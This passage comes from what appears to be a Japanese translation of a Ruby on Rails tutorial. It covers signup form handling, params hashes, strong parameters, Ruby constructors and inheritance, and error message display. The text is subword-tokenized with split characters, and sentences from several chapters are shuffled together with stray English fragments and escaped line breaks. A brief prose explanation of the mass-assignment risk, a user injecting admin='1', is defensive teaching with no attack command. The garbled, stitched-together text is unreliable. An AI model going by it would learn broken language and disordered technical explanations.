▁ ユーザー登録フォーム を 動か す ために 、 まず リスト \ ref { code : first _ create _ action } に ように コード を追加する ところ から 始 め ます 。
▁この リスト では 、\ ref { sec : partial s } の 「 パーシャル 」 の ところで も 使 った \ ko de { render } ▁ メソッドを 再度 使い ま わ しています 。 \ ko de { render } ▁ は コントローラのアクション の中で も 正常に動作し ます 。
▁ K e y ▁: success ▁has ▁ value ▁" I t ▁ w or ke d ! "
▁ここで 、 以前 に 説明 した \ ko de { if } - \ ko de { else } 分 岐 構造 を 思い 出 してください 。 この 文 を使用して 、 保存 が 成功 した かどうか に応じて \ ko de {@ user . save } の 値が \ ko de { true } または \ ko de { false } ▁(\ ref { sec : creat ing _ user _ objects }) ▁ になる ときに 、 それぞれ 成功 時の 処理 と 失敗 時の 処理 を 場合 分 け することができます 。
▁ ユーザー登録 の 失敗 に 対応 できる \ ko de { create } アクション
▁ここで 、 配列 の \ ko de { each } メソッド では 、 ブロック の 変数 は 1 つ だけです が 、 ハッシュの \ ko de { each } メソッド では 、 ブロック の 変数 は \ emph { キー } と \ emph { 値 } の 2 つ になっている ことに注意してください 。
▁従って 、 ▁ ハッシュ に対して \ ko de { each } メソッド を実行すると 、 ハッシュの 1 つの 「 キー と 値 の \ emph { ペ ア }」 ごとに 処理 を 繰り返し ます 。
▁ 最後の 例 として 、 便利な \ ko de { in spec t } メソッドを 紹 介 します 。 これは 要求 された オブジェクトを 表現 する 文字列 を返します 。
▁[1, ▁ 2, ▁ 3, ▁4 , ▁5 ]
▁# ▁ 保存 の 成功 を ここで 扱 う 。
▁ コメント にも ある ように 、 上のコード はまだ 実装 が 完了 していません ので 注意 してください 。
▁I t ▁ w or ke d !
▁しかし 実装 の 出 発 点 として は これ で 十分 です 。 なお 、 最終的な 実装 は \ ref { sec : strong _ parameters } で 完了 します 。
▁リスト \ ref { code : first _ create _ action } のコード の動作 を理解する もっと も よい 方法は 、 実際に 無効な ユーザー登録 データを \ emph { 送信 ▁( submit ) } してみる ことです 。
▁ ところで 、 オブジェクトを 表示 するために \ ko de { in spec t } を使用すること は 非常に よく ある こと なので 、 ▁\ ko de { p } 関数 という シ ョ ート カ ッ ト があります
▁ 結果を 図 \ ref { fig : signup _ failure } に 、 また 、 すべての デバッグ情報 を 図 \ ref { fig : signup _ failure _ rails _ debug } に 示 しました ▁( 読み やすい ように フ ォ ン ト サイズ を 拡大 しています )。
▁ 実際には 些 細 な 違 い があり 、\ ko de { p } メソッドは 画面 出力 だけで なく 返 り 値 も オブジェクト になります 。 しかし 、\ ko de { put s } メソッド の場合は 引数に よ らず 必ず \ ko de { nil } が 返 り 値 になります 。
▁( � 図 \ ref { fig : signup _ failure } の 下 部 に 見え ている の が Rails の \ emph { web ▁console } という 機能 です 。 これは rails ▁console を ブラウザ 上で 開 け るように し 、 デバッグ を し や す く するための 機能 です 。
▁( 指 摘 してくれ た K at ar z y n a ▁S i w e k に 感 謝 します 。 )
▁たとえば User モデル を調べ たい とき など には 便利です が 、 今 の ところ は ▁\ ko de { params } の 中 身 を 精 査 する などの 込 み 入 った ことはできません 。 )
▁ ユーザー登録 失敗
▁< n >\ end { code }< n >< n > ▁% ▁subsection ▁ hash es _ and _ symbol s ▁( end )< n >< n > ▁\ subsection { CSS ▁ re v is it ed } ▁% ▁( fold )< n > ▁\ label { sec : css _ re v is it ed }< n >< n >
▁それでは 、 もう一度 リスト \ ref { code : application _ layout _ redux } に 戻 り 、 レイアウト に ▁ CSS ▁( ca sc ad ing ▁ style ▁ sh e e t ) ▁ を追加する 以下の行 を見てみましょう 。
▁ ユーザー登録 失敗 時の デバッグ情報
▁ 今 なら 、 このコード を 理解 できる ようになった はずです 。
▁Rails が 送信 を扱う 方法 を より 深 く 理解 するために 、 デバッグ情報 のうち パラメータ ー ハッシュの \ ko de { user } の 部分を 詳 しく 見 てみましょう ▁( 図 \ ref { fig : signup _ failure _ rails _ debug })。
▁A s ▁ me n tion ed ▁ b ri e f ly ▁in ▁S ec tion ▁\ ref { sec : m o t i v ation } , ▁Rails ▁def in es ▁a ▁ special ▁f un c tion ▁to ▁ include ▁ stylesheets , ▁and
▁この ハッシュ は Users コントローラに \ ko de { params } として 渡 されます 。 \ ref { sec : a _ users _ resource } で説明した とおり 、 この \ ko de { params } ハッシュ には 各 リクエスト の 情報 が 含まれています 。
▁上のコードでは 、 この 関数 を 呼 んで います 。
▁ ユーザー登録 情報 の 送信 の場合 、\ ko de { params } には 複数の ハッシュ に対する ハッシュ ▁( hash - of - hash es : ▁ 入 れ 子 になった ハッシュ ) ▁ が含まれ ます ▁( なお 、\ ref { sec : hash es _ and _ symbol s } では hash - of - hash es の 説明 と とも に 、 コンソール セッション で使用する ために あえて \ ko de { params } という名前の 変数 を導入し ました )。
▁しかし 、 ここで 不 思 議 な 点が い く つ もあります 。
▁上の デバッグ情報 では 、 フォーム 送信 の 結果 が 、 送信された 値 に対応する 属性 と とも に \ ko de { user } ハッシュ に保存 されています 。 ハッシュの キー は 、\ ko de { input } タグ の \ ko de { name } 属性 です ▁( リスト \ ref { code : signup _ form })。
▁ 第 一 に 、 丸 かっこ が ありません 。
▁ 実は 、 Ruby ▁ では 丸 かっこ は 使用 しても し なくても 構 いません 。 以下の 2 つの 行 は 同 等 です 。
▁\ ko de { " user [ email ] "} という 名前 は 、\ ko de { user } ハッシュの \ ko de { email } 属性を 正 確 に 指 します 。
▁# ▁ 関数 呼び出し の 丸 かっこ は 省略 可能 。
▁ これはリスト \ ref { code : first _ create _ action } で使用されていま した 。
▁次に 、\ ko de { : media } 引数 は ハッシュの よう ですが 、 波 かっこ がない 点が 不 思 議 です 。
▁これは つまり 、 以下の行 は
▁ 実は 、 ハッシュ が 関数 呼び出し の \ emph { 最後の } 引数 である 場合は 、 波 かっこ を省略 できます 。 以下の 2 つの 行 は 同 等 です 。
▁ 以下 と ほぼ 等 価 である ということです 。
▁# ▁ 最後の 引数 が ハッシュ の場合 、 波 かっこ は 省略 可能 。
▁ 以前の バージョンの Rails では 、 以下のコード は
▁ 実際に 動作 しました が 、 動作 はデフォルトで 不 安 定 であり 、 悪意のある ユーザー によって アプリケーションの データベース が 書き 換 え られ ること の ないように 慎 重 な 手 続 き によって 使用 し なければ な らず 、 しか も その 手 続 は エラー を 起 こ し やすい もの で した 。
▁次に 、\ ko de { data - turbolinks - t rack } における キー と 値 の ペ ア の 表 記 が 、 旧 式 の ハッシュ ロ ケ ッ ト ▁( => ) ▁ スタイル になっている 点が 不 思 議 です 。
▁ 実は 、 以下のような 新しい ハッシュ 記 法 を使用すると 、
▁Rails ▁4.0 以降 では 、 上のコード は エラー になります ▁( 上の 図 \ ref { fig : signup _ failure } および 図 \ ref { fig : signup _ failure _ rails _ debug } を参照 )。 これにより 、 デフォルトで の セキュリティ が 高 め られ ました 。
▁< n >< n > ▁% ▁subsection ▁a _ working _ form ▁( end )< n >< n > ▁\ subsection { S trong ▁Parameters } ▁% ▁( fold )< n > ▁\ label { sec : strong _ parameters }< n >< n >
▁ ハ イ フ ン ▁( - ) ▁ が 入 っている ために エラーが発生し てしまいます 。
▁\ ref { sec : a _ user _ class } で 、\ emph { マ ス ア サ イン メ ン ト } の 概念 について 簡単に 説明 しました 。 これは 、 以下のように 値 の ハッシュ を使用して Ruby の 変数 を 初期化 する ものです 。
▁(\ ref { sec : hash es _ and _ symbol s } で 、 シンボル に ハ イ フ ン が 使 え なかった ことを思い出してください )
▁ このため 、 以下のような 旧 式 の ハッシュ ロ ケ ッ ト 記 法 を使用する しか ないので す 。
▁リスト \ ref { code : first _ create _ action } の コメント と 、 上の 再 録 コメント でも 重 ね て 指 摘 している ように 、 この 実装 は 最 終 形 ではありません 。
▁その 理由 は 、\ ko de { params } ハッシュ 全体 を 初期化 する という 行 為 は セキュリティ 上 、\ emph { 極めて } 危 険 だ からです 。 これは 、 ユーザーが 送信 した データを \ emph { ま る ご と } \ ko de { User . new } に 渡 している ことになります 。
▁最後に 、 Ruby が 以下のような コードを 正常に 実行 でき ている の が 不 思 議 です 。
▁ここで 、 User モデルに \ ko de { admin } 属性 という もの がある と しましょう 。 この 属性 は 、 Web サイトの 管理者 である かどうか を示します
▁上のコード には 途 中に 改 行 が含まれ ている にも か か わ らず です 。
▁( この 属性 を実装する のは \ ref { sec : admin ist r at ive _ users } になって からです )。
▁ 実は 、 Ruby は 改 行 と 空白 を 区別 していません
▁\ ko de { admin = ’ 1 ’ } という 値を \ ko de { params [: user ]} の一部 に 紛 れ 込 ま せ て 渡 して し ま えば 、 この 属性を \ ko de { true } に することができます 。 これは \ text tt { c url } などの コマンド ベース の HTTP クライアント を使用すれば 簡単に 行う ことができます 。
▁ 改 行 は 、 行 の 末尾 と 次の 行 の 始 まり を示します 。
▁ 行 を 分割 した \ emph { 理由 } は 、 1 行 を 8 0 字 以 内に 収 め て ソースコード を 読み や す く する ためです
▁\ ko de { params } ハッシュ が ま る ご と \ ko de { User . new } に渡され てしまう と 、 どの ユーザー でも \ ko de { admin = ’ 1 ’ } を Web リクエスト に 紛 れ 込 ま せる だけで Web サイトの 管理者 権限 を 奪 い 取 ること が できてしまいます 。
▁もちろん 、 人 間 が い ち い ち 文字 数 を \ emph { 数 え て } い たら 頭 が どう に か な ってしまいます 。 だ から こ そ 、 多くの テキストエディタ には これら を 支 援 する 機能 が 備 わ っています 。
▁ 以前の バージョンの Rails では 、\ ko de { モデル } 層 で \ emph { attr \_ access i b le } メソッド を使用することで 上 のような 危 険 を 防止 していました が 、 ▁Rails ▁4.0 では コントローラ 層 で \ emph { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁たとえば 、 図 \ ref { fig : c lo u d 9 _ gemfile } , を もう一度 見 てみると 、 コードを 8 0 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に 見え ます 。
▁S trong ▁Parameters を使用することで 、\ emph { 必 須 } の パラメータ と \ emph { 許可 された } パラメータ を指定する ことができます 。
▁\ ref { sec : development _ environment } で紹介した Cloud ▁ IDE では 、 デフォルトで このような 行 が含まれ ます 。
▁さらに 、 上の ように \ ko de { params } ハッシュ を ま る ご と 渡す と エラー が発生する ので 、 Rails はデフォルトで マ ス ア サ イン メ ン ト の 脆弱性 から 守 られ る ようになりました 。
▁Text M at e を使用し ていれば 、\ text tt { View ▁ > ▁ W r a p ▁C ol um n ▁ > ▁ 7 8 } で 設定 できます 。
▁S ublime ▁Text を使用し ていれば 、\ text tt { View ▁ > ▁ R ul er ▁ > ▁ 7 8 } 、 または \ text tt { View ▁ > ▁ R ul er ▁ > ▁ 8 0} で 設定 できます 。
▁ この場合 、\ ko de { params } ハッシュ では \ ko de { : user } 属性を 必 須 と し 、 名前 、 メールアドレス 、 パスワード 、 パスワード の 確認 の 属性を それぞれ 許可 し 、 それ 以外 を 許可 し ないように したい と 考え ています 。
▁従って 、
▁上のコードでは \ ko de { stylesheet \_ link \_ tag } 関数 を 2 つの 引数 で 呼 んで います 。 最初の 引数 である 文字列 は 、 スタイルシート への パス を 示 しています 。 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メ デ ィ ア タイプ を 示 し 、 次の 要素 は Rails ▁4.0 で 追加 された \ href { https :// github . com / rails / turbolinks } { turbolinks } という 機能を オン に しています 。
▁この コードの 戻り値 は 、\ ko de { params } ハッシュ のバージョン と 、 許可 された 属性 です ▁(\ ko de { : user } 属性 が ない場合は エラー になります )。
▁( CSS ファイル名 の 後に 、\ ko de { ? body = 1 } のような 行 が 余 分 に 表示 されている ことがあります 。
▁これらの パラメータ を 使い や す く するために 、\ ko de { user \_ params } という 外部 メソッド を使用する の が 慣習 になっています 。 このメソッドは 適切に 初期化 した ハッシュ を返し 、\ ko de { params [: user ]} の 代 わ り として 使用されます 。
▁ これらは Rails によって 挿 入 されている もの で 、 サーバー 上で 変更 が あった 場合に ブラウザ が CSS を 再 読み込み するのに 使用します 。 )
▁この \ ko de { user \_ params } メソッドは Users コントローラの 内部で のみ 実行 され 、 Web 経由で 外部 ユーザーに さ ら される 必要 は ない ため 、 リスト \ ref { code : create _ action _ strong _ parameters } に 示す ように Ruby の \ ko de { private } キーワード を使って \ ko de { 外部 から 使用 できない } ようにします
▁ インクルード された CSS によって 生成された HTML ソース 。
▁(\ ko de { private } キーワード の詳細については ▁\ ref { sec : remember _ me } で説明します )。
▁We ’ ll ▁ set ▁ about ▁ cha n g ing ▁this ▁in ▁C ha p ter ▁\ ref { cha : fi ll ing _ in _ the _ layout } .
▁Ruby では あらゆる もの が オブジェクト である ということ は 既に 説明 しました が 、 この節 では 実際に オブジェクトを いくつか 定義 してみましょう 。
▁\ ko de { create } アクション で S trong ▁Parameters を使用する
▁Ruby は 、 多くの オブジェクト 指 向 言語 と同様 、 メソッドを まとめ る の に \ emph { クラス } を使用しています 。 これらの クラス から \ emph { インスタンス が 生成される } ことで オブジェクトが 作成されます 。
▁ オブジェクト 指 向 プログラミング の 経験 がない 方 にとって は 何 の こと だ か わ から ない と思います ので 、 いくつかの 具 体 例 を 示す ことにします 。
▁< n >< n >< n > ▁\ subsection { コ ン スト ラ ク タ } ▁% ▁( fold )< n > ▁\ label { sec : const r u ct or s }< n >< n >
▁ 実は 、 これまで 示 した 多くの 例 の中で も 、 クラス を使用して オブジェクトの インスタンス を作成し てきた のですが 、 オブジェクト を作成する ところ を 明示的に 説明 していません で した 。
▁たとえば 、 ダ ブ ル ク ォ ート を使って 文字列 の インスタンス を作成し ましたが 、 これは 文字列 の オブジェクトを 暗 黙 で 作成する \ emph { リ テ ラ ル コ ン スト ラ ク タ } です 。
▁=> ▁ String
▁上のコードでは 、 文字列 が \ ko de { class } メソッド に 応答 し ており 、 その 文字列 が 所 属 する クラス を 単 に 返 している ことがわかります 。
▁ 暗 黙 の リ テ ラ ル コ ン スト ラ ク タ を使う 代わりに 、 明示的に 同 等 の \ emph { 名前付き コ ン スト ラ ク タ } を使う ことができます 。 名前付き コ ン スト ラ ク タ は 、 クラス名 に対して \ ko de { new } メソッド を呼び出します
▁ ちなみに 、\ ko de { private } キーワード 以降 の コードを 強 調 するために 、\ ko de { user \_ params } の インデント を 1 段 深 く して あります 。
▁このメソッド の動作 は 、 使用している Ruby のバージョン によって 異なる 可能性があります 。
▁( 経験 的に は これは 賢 い 慣習 だ と思います 。 という の も 、 クラス 内に 多数の メソッド がある場合 、 private メソッドの 場所 が 簡単に 見つか る からです 。 これにより 、 インデント が 無 い 場合 と 比 べ て 、 ど こ から private になる のか 困 惑 すること が なくなります 。 )
▁この 例 では Ruby ▁1. 9 . 3 以上 のバージョン を 前 提 と しています 。
▁ この時点で 、 ( 送信 ボタン を 押 しても エラー が 出 ない という 意味 で ) ▁ ユーザー登録フォーム は 動く ようになります 。
▁ただし 図 \ ref { fig : invalid _ submission _ no _ feed b ack } が 示す ように 、 ( 開発者 用の デバッグ 領 域 を 除 いて ) ▁ 間 違 った 送信 を しても 何も フィード バ ッ ク が 返 って き て いません 。 これは ユーザーが 困 惑 する 原 因 となります 。
▁また 、 有効な ユーザー情報 を送信し ても 新しい ユーザーが 実際に 作成される ことも ありません 。
▁ 前 者 の 問題 を \ ref { sec : signup _ error _ messages } で 、 後 者 の 問題 を \ ref { sec : success f ul _ signup s } で それぞれ 解決 していきます 。
▁この 動作 は リ テ ラ ル コ ン スト ラ ク タ と 同 等 ですが 、 動作 の内容 が 明 確 に 示 されています 。
▁ 無効な 情報を ユーザー登録フォーム で 送信 した 結果
▁ 配列 でも 、 文字列 と同様に インスタンス を 生成 できます 。
▁=> ▁[1, ▁ 3, ▁2 ]
▁ ユーザー登録 に 失敗した場合 の 最後の 手順 として 、 問題が生じ た ために ユーザー登録 が行われ なかった ということ を ユーザーに わかりやすく 伝 え る エラーメッセージ を追加しましょう 。
▁ただし 、 ハッシュ の場合は 若 干 異なります 。
▁Rails は 、 このような メッセージ を User モデルの 検証 時に 自動的に 生成 してくれます 。
▁ 配列 の コ ン スト ラ ク タ である \ ko de { Array . new } ▁ は 配列 の 初期 値を 引数に 取り ます が 、 ▁\ ko de { Hash . new } ▁ は ハッシュの \ emph { デフォルト } ▁ 値を 引数に 取り ます 。 これは 、 キー が存在し ない場合 の デフォルト値 です 。
▁たとえば 、 ユーザー情報 の メールアドレス が 無効 で 、 パスワード が 短 すぎる 状態 で 保存 し よう と した とします 。
▁=> ▁[" E mail ▁is ▁ invalid ", ▁" P as s word ▁is ▁to o ▁ sh or t ▁( minimum ▁is ▁ 6 ▁ cha r a c ter s ) "]
▁ メソッドが クラス 自身 ▁( この場合は \ ko de { new }) ▁ に対して 呼び出される とき 、 このメソッド を \ emph { クラス メソッド } と呼びます 。
▁ クラスの \ ko de { new } メソッドを 呼び出し た 結果 は 、 その クラスの オブジェクト であり 、 これは クラスの \ emph { インスタンス } とも 呼ばれ ます 。
▁\ ko de { length } のように 、 インスタンス に対して 呼 び 出 す メソッドは \ emph { インスタンス メソッド } と 呼ばれ ます 。
▁ クラス について 学ぶ とき 、\ emph { s up er class } メソッドを使って \ ko de { クラス 階層 } を調べ てみると よく わかり ます 。
▁\ ref { sec : presence _ validation } で 少し 触 れ た ▁\ ko de { errors . full \_ messages } オブジェクトは 、 ▁ エラーメッセージ の配列 を 持 っています 。
▁上の コンソール セッション に 示 されている ように 、 リスト \ ref { code : first _ create _ action } で 保存 に 失敗する と 、\ ko de {@ user } オブジェクト に 関連付けられた エラーメッセージ の 一覧 が 生成されます 。
▁=> ▁ Object
▁この メッセージ を ブラウザで 表示する には 、 ユーザーの \ ko de { new } ページ で エラーメッセージ の パーシャル ▁( partial ) ▁ を 出力 します 。 このとき 、\ ko de { form - control } という CSS クラス も 一 緒 に追加する ことで 、 Bootstrap が うまく 取り 扱 っ てくれる ようになります 。 変更 の 結果を リスト \ ref { code : f _ error _ messages } に示します 。
▁=> ▁B as i c Object
▁ここで 使用している エラーメッセージ の パーシャル は あ く まで 試 作 品 である 点に注意 してください 。 最 終 版 は \ ref { sec : creat ing _ microposts } を参照してください 。
▁ ユーザー登録 失敗 時に エラーメッセージ が表示される ように する
▁ 継 承 階層 を 図 \ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } に示します 。
▁ここでは 、\ ko de { String } クラスの ス ー パ ー クラス は \ ko de { Object } クラス で 、\ ko de { Object } クラスの ス ー パ ー クラス は \ ko de { B as i c Object } クラス ですが 、 ▁\ ko de { B as i c Object } クラス は ス ー パ ー クラス を 持 た ない ことがわかります 。
▁この 図 式 は 、 すべての ▁Ruby ▁ の オブジェクト において 成 り 立 ち ます 。 クラス 階層 を た ど って い く と 、 ▁Ruby における すべての クラス は 最終的に ス ー パ ー クラス を 持 た ない \ ko de { B as i c Object } クラス を継承し ています 。
▁これ が 、 " Ruby では あらゆる もの が オブジェクト である " ▁ ということ の 技術 的な 意味 です 。
▁\ ko de { String } クラスの 継 承 階層
▁ここでは 、\ ko de { ’ shared / error \_ messages ’ } という パーシャル を \ ko de { render } ▁( レンダリング ) ▁ して いる点に注目してください 。 これは Rails 全 般 の 慣習 で 、 パーシャル は 複数の コントローラに わ た る ビュー に 対 し 、 専 用の \ ko de { shared / } ディレクトリ を使用する ようにしています
▁ クラス について の 理解 を 深 め る には 、 自分 で クラス を作成 してみる の が 一 番 です 。
▁( これは \ ref { sec : edit _ form } で 実現 します )。
▁ そこで 、\ ko de { Word } クラス を作成し 、 その 中に 、 ある 単 語 を 前 から と 後 ろ から の どちら から 読んで も 同じ ▁( つまり 回 文 になっている ) ▁ なら ば \ ko de { true } を返す \ ko de { palindrome ?} メソッド を作成 してみましょう 。
▁ただし 、 今 はまだ \ ko de { app / views / shared } といった ディレクトリ は 作 って い ないので 、 表 \ ref { table : un i x _ command s } で紹介した \ ko de { m k d ir } コマンド を 使い 、 新しく ディレクトリ を 作成する必要があります 。
▁ パーシャル の内容 は リスト \ ref { code : errors _ partial } のようになります 。
▁この クラス と メソッドは 以下のように 使う ことができます 。
▁ フォーム 送信 時に エラーメッセージ を表示する ための パーシャル
▁=> ▁#< Word : 0 x 22 d 0 b 20 >
▁ も し 上の 例 が 少し 不 自 然 に 思える なら ば 、 勘 が 鋭 い と い え ます 。 という の も 、 これは わ ざ と 不 自 然 に 書いた からです 。
▁ パーシャル によって 、 Rails と Ruby には 、 Rails エラー オブジェクト 用の 2 つの メソッド を含む 多くの 成 果 物 が 導入 されました 。
▁ 文字列を 引数に 取 る メソッドを 作る ため だけ に 、 わざわざ 新しい クラス を 作る のは 変 です 。
▁ 最 初 は \ ko de { count } メソッドを 紹 介 します 。 これは エラー の 数 を返します 。
▁ 単 語 \ emph { は } 文字列 なので 、 リスト \ ref { code : word _ class } のように \ ko de { Word } クラス は ▁\ ko de { String } クラス を \ emph { 継 承 } する の が 自 然 です
▁ もう 1 つ は \ ko de { any ?} メソッド です 。 これは \ ko de { empty ?} メソッドと 互 い に 補 完 します 。
▁( 以下の リスト を入力する 前に 、 古 い \ ko de { Word } クラスの 定義 を 消 去 するために 、 Rails コンソール を い った ん 終 了 してください )。
▁ コンソール で \ ko de { Word } クラス を定義する 。
▁\ ref { sec : objects _ and _ message _ passing } では 文字列 に対して \ ko de { empty ?} メソッド を使用し ましたが 、 Rails の エラー オブジェクト に対して も 使用できます 。 オブジェクトが 空 の場合は \ ko de { true } 、 ▁ それ以外の 場合は ▁\ ko de { false } を返します 。
▁\ ko de { any ?} メソッドは ち ょ う ど \ ko de { empty ?} と 逆 の動作 で 、 要素 が 1 つ でも ある 場合は \ ko de { true } 、 ない場合は \ ko de { false } を返します 。
▁( なお 、 これらの \ ko de { count }、\ ko de { empty ?} 、\ ko de { any ?} メソッドは 、 Ruby の配列 に対して も そのまま 使用できます 。
▁\ ref { sec : static _ pages } でも 簡単に 説明 しました が 、 上のコード のは 継 承 のための Ruby の ▁\ ko de { Word ▁< ▁ String } ▁ 記 法 です 。 こうすることで 、 新しい \ ko de { palindrome ?} メソッド だけ ではなく 、 String クラス で 使用できる すべての メソッドを Word クラス に対して も 使用 できるようになります 。
▁これは \ ref { sec : show ing _ microposts } で 応 用 する 予定です 。 )
▁さらに 、\ ko de { pluralize } という 英語 専 用の テキスト ヘルパー が 新 た に 登 場 しています 。
▁=> ▁" le ve l "
▁=> ▁" 1 ▁ error "
▁# ▁ Word が 鏡 文字 かどうか
▁=> ▁" 5 ▁ errors "
▁\ ko de { pluralize } の最初の 引数に 整 数 が与えられ ると 、 それ に基づいて 2 番目の 引数 の 英 単 語 を 複数形 に変更 した もの を返します 。
▁このメソッド の 背 後に は 強力な \ emph { イン フ レ ク ター ▁( 活用 形 生成 ) ▁ } ▁ があり 、 不 規 則 活用 を含む さまざまな 単 語 を 複数形 に することができます 。
▁\ ko de { Word } クラス は \ ko de { String } クラス を継承し ている ので 、 コンソール を使用して クラス 階層 を 明示的に 確認 できます 。
▁=> ▁" 2 ▁ w o me n "
▁=> ▁ Word
▁=> ▁" 3 ▁ er r at a "
▁\ ko de { pluralize } を使用することで 、 コード は以下のようになります 。
▁このコードは たとえば ▁\ ko de { " 0 ▁ errors " }、\ ko de { " 1 ▁ error " }、\ ko de { " 2 ▁ errors "} ▁ などの ように 、 エラー の 数 に応じて 活用 された 単 語 を返します 。 これにより 、\ ko de { " 1 ▁ errors "} ▁ のような 英語 の 文法 に 合 わ ない 文字列 を避ける ことができます ▁( これは Web 上で どう し よう も ない ほど よく 見 かけ る エラー です )。
▁ 図 \ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } に この クラス 階層 を示します 。
▁ The ▁ inheritance ▁ h i er ar ch y ▁for ▁the ▁( n on - b u il t - in ) ▁\ ko de { Word } ▁class ▁ from ▁ L ist ing ▁\ ref { code : word _ class } .
▁さらに Rails は 、 無効な 内容 で 送信 が されて 元の ページに 戻 される と 、\ ko de { div } で 囲 まれ た エラー 用の CSS クラス \ ko de { field \_ with \_ errors } を返します 。
▁リスト \ ref { code : word _ class } では 、 単 語 の 文字 を 逆 順 にしたもの が 元の 単 語 と同じ である かどうか の チェック を 、\ ko de { Word } クラス の中から 自分自身 が 持つ 単 語 にアクセス することで 行 な っている ことにご注目ください 。
▁これらの ラ ベ ル によって 、 リスト \ ref { code : error _ messages _ css } のように エラーメッセージ を S CSS で 整 形 することができます 。 ここでは 、 Sass の \ ko de {@ ext end } 関数 を使って Bootstrap の \ ko de { has - error } という CSS クラス を 適 用 してみます 。
▁Ruby では 、\ ko de { self } キーワード を使用して これ を指定する ことができます 。 \ ko de { Word } クラス の中で は 、\ ko de { self } は オブジェクト 自身 を 指 します 。 これは つまり 、 以下のコード を使用して 、
▁ エラーメッセージ に スタイル を与える ための CSS
▁ 単 語 が 回 文 である かどうかを確認 できる ということです
▁リスト \ ref { code : f _ error _ messages } と リスト \ ref { code : errors _ partial } のコード と 、 S CSS の リスト \ ref { code : error _ messages _ css } を 組み合わせ ること で 、 無効な ユーザー登録 情報 を送信し たとき の エラーメッセージ が 分 か り や す く なります ▁( 図 \ ref { fig : signup _ error _ messages })。
▁Ruby の クラス や \ ko de { self } について もっと 詳 しく 知りたい 場合は 、\ href { http :// rails t ip s . org /}{ Rails T ip s } に 投 稿 された ▁“ \ href { http :// rails t ip s . org / blog / ar ch ive s / 200 6 / 11 / 18 / class - and - instance - variable s - in - ruby /}{ Ruby における クラス と インスタンス変数 } ” ▁( 英語 ) ▁ を参照してください 。
▁これらの メッセージ は モデルの 検証 時に 生成される ので 、 メールアドレス の スタイル や パスワード の 最 小 文字列 など を変更する と 、 メッセージ も 自動的に 変更 されます 。 [ B R ] < n > [ B R ] < n > ( このとき 、 存在性 のバリデーション も has \_ secure \_ password による バリデーション も 空 の パスワードを 検 知 してしまう ため 、 ユーザー登録フォーム で 空 の パスワード を入力する と 2 つの 同じ エラーメッセージ が表示され てしまいます 。 もちろん こういった 冗 長 な エラーメッセージ を直接 修正 すること も 可能です が 、 幸 運 にも 今回の 場合は 、 後 ほど 追加 する ▁ allow \_ nil : ▁true ▁という オプション で この問題 は 解決 できます 。 )
▁なお 、 String クラスの 内部で は 、 メソッド や 属性 を呼び出す とき の \ ko de { self . } も 省略 可能です 。
▁ といった 省略 記 法 でも 、 うまく 動 きます 。
▁ 継 承 は 強力な 概念 ですが 、 も し 仮 に 継 承 を使用 せずに \ ko de { palindrome ?} メソッドを \ ko de { String } クラス 自身 に追加する ▁( つまり String クラス を 拡 張 する ) ▁という 、 より 自 然 な 方法 を使用すること が 可能 だと した ら 、 わざわざ Word クラス を 作 ら なくても \ ko de { palindrome ?} を リ テ ラ ル 文字列 に対して 直接 実行 できる よう になるはずです 。 そ ん な ことが 可能な の でしょう か ▁( なお 、 現在の コードは その よう になっ ていない ため 、 以下のように エラー になります )。
▁ ユーザー登録 失敗 時の エラーメッセージ
▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` palindrome ? '
▁ 完全な テスト 機能を 備 え た 強力な Web フレームワーク が なかった 頃 は 、 開発者 は フォームの テストを 毎 回 手動で 行う 必要 があり ました 。
▁for ▁" le ve l " : String
▁たとえば 、 も し 仮 に ユーザー登録ページ を 手動で テスト し なければならない と した ら 、 ブラウザで その ページ を表示し 、 有効な データ と 無効な データを 交 互 に 流 し こ み 、 どちら の場合 にも アプリケーション が 正常に 動作する ことを確認 し なければならない でしょう 。
▁ 驚 いた ことに 、 Ruby では 組み込み の 基本 クラスの 拡 張 が 可能な のです 。 Ruby ▁ の クラス は \ emph { オープン } で 変更 可能 であり 、 クラス 設計 者 でない 開発者 でも これらの クラス に メソッドを 自由に 追加 すること が 許 されています
▁さらに 、 アプリケーション に変更 が 生じる たびに 、 まったく 同じ テストを 繰 り 返 さ なければなりません 。
▁この プロセス は 苦 痛 で 、 バグ も 発生 し が ち です 。
▁しかし 幸 運 な ことに 、 Rails では フォーム 用の テストを書く ことができ 、 こういった プロセス を 自動 化 することができます 。
▁ 本 項 では 、 無効な 送信 を した とき の 正しい 振る舞い について テストを 書い ていきます 。 \ ref { sec : a _ test _ for _ valid _ submission } では 同様 の 方法で 、 有効な 送信 を した とき の 正しい 振る舞い について テストを 書い ていきます 。
▁まずは 、 新規ユーザー 登録 用の 統合テスト を生成する ところ から 始 め ていきます 。 コントローラ ー の 慣習 である 「 リソース 名 は 複数形 」 に 因 んで 、 統合テスト の ファイル名 は \ ko de { users \_ signup } とします 。
▁( Ruby で 組み込み クラス に メソッドを 追加 できる ということ は 実 に ク ー ル ですが 、\ ko de { " de ified "} ▁( = 神 格 化 された ) ▁という 単 語 が 回 文 になっている ことも 、 それ に 劣 らず ク ー ル では ない でしょう か 。 )
▁ 組み込み クラスの 変更 は き わ め て 強力な テクニック ですが 、 大 い な る 力 には 大 い な る 責 任 が 伴 います ▁( 訳 注 : ▁ 「 ス パ イ ダ ー マ ン 」 の 名 台 詞 )。 従って 、\ emph { 真 に } 正 当 な 理由 がない 限 り 、 組み込み クラス に メソッド を追加する ことは 無 作 法 である と 考え られ ています 。
▁Rails の場合 、 組み込み クラスの 変更を 正 当 化 できる 理由 が い く つ もあります 。 たとえば 、 Web ▁ アプリケーション では 、 変数 が 絶 対 に \ emph { 空白 } に なら ないように した くなる ことが よく あります ▁( ユーザー名 など は スペース や \ href { http :// en . w ikipedia . org / wiki / W h it e space _ ( com put er _ sc i en ce ) } { その他 の 空白 文字 } になって 欲 しく ない ものです ) ▁ ので 、 Rails は \ ko de { blank ?} メソッドを Ruby ▁ に追加 しています 。
▁(\ ref { sec : a _ test _ for _ valid _ submission } で 書く テスト でも 、 ここで 生成 した ファイル を使います )
▁Rails の 拡 張 は自動的に Rails コンソール にも 取り 込 まれ る ので 、 以下のように コンソール で 拡 張 の 結果を 確認 できます ▁( 注意 : ▁ 以下のコード は 純 粋 な ▁\ ko de { i rb } ▁ では 動作 しません )。
